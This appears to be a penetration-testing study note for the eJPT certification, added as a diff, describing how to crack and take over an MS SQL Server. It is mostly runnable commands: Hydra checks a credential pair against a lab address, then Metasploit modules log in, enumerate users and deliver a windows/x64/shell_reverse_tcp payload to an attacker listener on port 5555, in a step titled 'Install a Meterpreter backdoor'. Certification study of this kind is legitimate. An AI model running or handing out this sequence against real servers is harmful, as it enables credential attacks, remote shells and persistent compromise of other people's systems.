@@ -1,0 +1,41 @@
+[eJPT]Crack MS SQL Server
+The main idea is shown below:
+- First, obtain a username/password pair of the target, a MS SQL Server;
+- Second, utilize Hydra to verify the username/password pair;
+- Third, launch Metasploit-Framework to exploit the MS SQL Server through the following sequence:
+* auxiliary/scanner/mssql/mssql_login
+* auxiliary/admin/mssql/mssql_enum
+* exploit/windows/mssql/mssql_payload
+
+
+1) Obtain an username/password pair and would like to verify the effectiveness the pair by applying Hydra:
+#hydra -l admin -p test123 mssql://172.16.33.33
+
+2) Verify the username/password pair by Metasploit Framework:
+#msfconsole
+msf5 > use auxiliary/scanner/mssql/mssql_login
+msf5 auxiliary(scanner/mssql/mssql_login) > set rhosts xxx.xxx.xxx.xxx
+msf5 auxiliary(scanner/mssql/mssql_login) > set username xxx
+msf5 auxiliary(scanner/mssql/mssql_login) > set password xxx
+msf5 auxiliary(scanner/mssql/mssql_login) > run
+
+3) Enumerate the other users:
+msf5 auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
+msf5 auxiliary(admin/mssql/mssql_enum) > set rhosts xxx.xxx.xxx.xxx
+msf5 auxiliary(admin/mssql/mssql_enum) > set username xxx
+msf5 auxiliary(admin/mssql/mssql_enum) > set password xxx
+msf5 auxiliary(admin/mssql/mssql_enum) > run
+
+4) Install a Meterpreter backdoor:
+msf5 auxiliary(admin/mssql/mssql_enum) > use exploit/windows/mssql/mssql_payload
+msf5 exploit(windows/mssql/mssql_payload) > set rhosts xxx.xxx.xxx.xxx
+msf5 exploit(windows/mssql/mssql_payload) > set username xxx
+msf5 exploit(windows/mssql/mssql_payload) > set password xxx
+msf5 exploit(windows/mssql/mssql_payload) > set SRVPORT 53
+msf5 exploit(windows/mssql/mssql_payload) > set payload windows/x64/shell_reverse_tcp
+msf5 exploit(windows/mssql/mssql_payload) > set lhost xxx.xxx.xxx.xxx
+msf5 exploit(windows/mssql/mssql_payload) > set lport 5555
+#nc -k -l -p 5555
+msf5 exploit(windows/mssql/mssql_payload) > exploit
+
+5) Happy hunting!
